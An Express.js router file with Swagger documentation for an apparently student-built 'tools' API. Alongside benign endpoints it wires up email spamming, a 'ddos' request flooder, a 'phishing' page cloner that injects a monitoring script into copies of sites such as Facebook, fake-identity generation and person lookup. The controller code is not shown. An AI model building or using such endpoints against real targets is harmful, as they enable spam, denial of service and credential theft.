const express = require('express');
const {
  checkEmailExistence,
  generateSecurePassword,
  sendEmailSpam,
  checkPasswordStrength,
  getSubdomains,
  generateFakeIdentity,
  ddos,
  fetchHtmlFromUrl,
  writeToFile,
  getRandomPersonImage,
  searchPersonLinks,
} = require('../controllers/toolController');
const router = express.Router();

/**
 * @swagger
 * tags:
 *   name: Tools
 *   description: Various utility tools and functions
 */



/**
 * @swagger
 * /api/tools/check_email:
 *   post:
 *     summary: Verify the existence of an email
 *     tags: [Tools]
 *     security:
 *       - BearerAuth: []
 *     requestBody:
 *       required: true
 *       content:
 *         application/json:
 *           schema:
 *             type: object
 *             properties:
 *               email:
 *                 type: string
 *                 description: Email to verify
 *                 example: lino.arceau@my-digital-school.org
 *     responses:
 *       200:
 *         description: Email verification result
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 emailExists:
 *                   type: boolean
 *                   example: true
 *       400:
 *         description: Missing or invalid email
 *       500:
 *         description: Internal server error
 */
router.post('/check_email', checkEmailExistence);

/**
 * @swagger
 * /api/tools/generate-password:
 *   post:
 *     summary: Generate a secure password
 *     tags: [Tools]
 *     security:
 *       - BearerAuth: []
 *     requestBody:
 *       required: true
 *       content:
 *         application/json:
 *           schema:
 *             type: object
 *             properties:
 *               length:
 *                 type: integer
 *                 description: Length of the generated password
 *                 example: 12
 *     responses:
 *       200:
 *         description: Generated password
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 password:
 *                   type: string
 *                   example: "@Qw3rTy*12$"
 *       401:
 *         description: Unauthorized
 */
router.post('/generate-password', generateSecurePassword);

/**
 * @swagger
 * /api/tools/send-email-spam:
 *   post:
 *     summary: Send spam emails
 *     tags: [Tools]
 *     security:
 *       - BearerAuth: []
 *     requestBody:
 *       required: true
 *       content:
 *         application/json:
 *           schema:
 *             type: object
 *             properties:
 *               email:
 *                 type: string
 *                 example: spam@example.com
 *               subject:
 *                 type: string
 *                 example: Test Subject
 *               message:
 *                 type: string
 *                 example: "This is a test spam email message."
 *               count:
 *                 type: integer
 *                 example: 5
 *     responses:
 *       200:
 *         description: Emails sent successfully
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 message:
 *                   type: string
 *                   example: "Successfully sent 5 emails to spam@example.com."
 *       400:
 *         description: Missing required fields
 *       500:
 *         description: Internal server error
 */
router.post('/send-email-spam', sendEmailSpam);

/**
 * @swagger
 * /api/tools/check_password_strength:
 *   post:
 *     summary: Check the strength of a password
 *     tags: [Tools]
 *     security:
 *       - BearerAuth: []
 *     requestBody:
 *       required: true
 *       content:
 *         application/json:
 *           schema:
 *             type: object
 *             properties:
 *               password:
 *                 type: string
 *                 example: "password"
 *     responses:
 *       200:
 *         description: Password strength evaluation
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 isCommon:
 *                   type: boolean
 *                   example: true
 *                 message:
 *                   type: string
 *                   example: "The password is among the most commonly used passwords. Please choose a more secure password."
 *       400:
 *         description: Missing password
 *       500:
 *         description: Internal server error
 */
router.post('/check_password_strength', checkPasswordStrength);

/**
 * @swagger
 * /api/tools/getSubdomains:
 *   post:
 *     summary: Retrieve subdomains for a domain
 *     tags: [Tools]
 *     security:
 *       - BearerAuth: []
 *     requestBody:
 *       required: true
 *       content:
 *         application/json:
 *           schema:
 *             type: object
 *             properties:
 *               domain:
 *                 type: string
 *                 example: www.apple.com
 *     responses:
 *       200:
 *         description: List of subdomains
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 domain:
 *                   type: string
 *                   example: "example.com"
 *                 subdomains:
 *                   type: array
 *                   items:
 *                     type: string
 *                   example: ["mail.example.com", "blog.example.com"]
 *       400:
 *         description: Missing or invalid domain
 *       500:
 *         description: Internal server error
 */
router.post('/getSubdomains', getSubdomains);

/**
 * @swagger
 * /api/tools/generateFakeIdentity:
 *   get:
 *     summary: Generate a fake identity
 *     tags: [Tools]
 *     security:
 *       - BearerAuth: []
 *     responses:
 *       200:
 *         description: Generated fake identity
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 firstName:
 *                   type: string
 *                   example: "Jean"
 *                 lastName:
 *                   type: string
 *                   example: "Dujardin"
 *                 email:
 *                   type: string
 *                   example: "jean.dujardin@example.com"
 *                 phoneNumber:
 *                   type: string
 *                   example: "+33 6 12 34 56 78"
 *       401:
 *         description: Unauthorized
 */
router.get('/generateFakeIdentity', generateFakeIdentity);

/**
 * @swagger
 * /api/tools/ddos:
 *   post:
 *     summary: Simulate a DDoS attack by sending multiple requests
 *     tags: [Tools]
 *     security:
 *       - BearerAuth: []
 *     requestBody:
 *       required: true
 *       content:
 *         application/json:
 *           schema:
 *             type: object
 *             properties:
 *               url:
 *                 type: string
 *                 example: "http://example.com"
 *     responses:
 *       200:
 *         description: Requests sent successfully
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 message:
 *                   type: string
 *                   example: "Requests completed successfully."
 *                 statuses:
 *                   type: array
 *                   items:
 *                     type: object
 *                     properties:
 *                       requestNumber:
 *                         type: integer
 *                         example: 1
 *                       status:
 *                         type: integer
 *                         example: 200
 *       400:
 *         description: Missing URL
 *       500:
 *         description: Internal server error
 */
router.post('/ddos', ddos);

/**
 * @swagger
 * /api/tools/phishing:
 *   post:
 *     summary: Fetch and save HTML content of a URL
 *     tags: [Tools]
 *     security:
 *       - BearerAuth: []
 *     requestBody:
 *       required: true
 *       content:
 *         application/json:
 *           schema:
 *             type: object
 *             properties:
 *               url:
 *                 type: string
 *                 description: The URL of the web page to copy
 *                 example: "https://fr-fr.facebook.com/"
 *     responses:
 *       200:
 *         description: HTML saved successfully
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 message:
 *                   type: string
 *                   example: "Web page copied successfully with monitoring script."
 *                 url:
 *                   type: string
 *                   example: "http://31.207.34.16:5000/generated/copied_page/index.html"
 *       400:
 *         description: Missing or invalid fields
 *       401:
 *         description: Unauthorized, no token provided or token invalid
 *       403:
 *         description: Access denied, insufficient permissions
 *       500:
 *         description: Internal server error
 */
router.post('/phishing', fetchHtmlFromUrl);



//router.post('/write-to-file', writeToFile);

/**
 * @swagger
 * /api/tools/random-person-image:
 *   get:
 *     summary: Fetch a random AI-generated person image
 *     tags: [Tools]
 *     security:
 *       - BearerAuth: []
 *     responses:
 *       200:
 *         description: Image fetched successfully
 *         content:
 *           image/jpeg:
 *             schema:
 *               type: string
 *               format: binary
 *       401:
 *         description: Unauthorized
 *       500:
 *         description: Failed to fetch image
 */
router.get('/random-person-image', getRandomPersonImage);

/**
 * @swagger
 * /api/tools/search-person-links:
 *   post:
 *     summary: Search for online links about a person
 *     tags: [Tools]
 *     security:
 *       - BearerAuth: []
 *     requestBody:
 *       required: true
 *       content:
 *         application/json:
 *           schema:
 *             type: object
 *             properties:
 *               personName:
 *                 type: string
 *                 example: "philippe katerine"
 *     responses:
 *       200:
 *         description: Links retrieved successfully
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 personName:
 *                   type: string
 *                   example: "philippe katerine"
 *                 relevantData:
 *                   type: object
 *                   properties:
 *                     organicLinks:
 *                       type: array
 *                       items:
 *                         type: object
 *                         properties:
 *                           title:
 *                             type: string
 *                             example: "philippe katerine - Biography"
 *                           link:
 *                             type: string
 *                             example: "http://example.com/philippe katerine"
 *                           snippet:
 *                             type: string
 *                             example: "Snippet about philippe katerine."
 *                     featuredSnippet:
 *                       type: string
 *                       example: "philippe katerine is a singer."
 *                     knowledgeGraph:
 *                       type: object
 *                       example: {}
 *       400:
 *         description: Missing personName
 *       500:
 *         description: Failed to fetch links
 */
router.post('/search-person-links', searchPersonLinks);

module.exports = router;
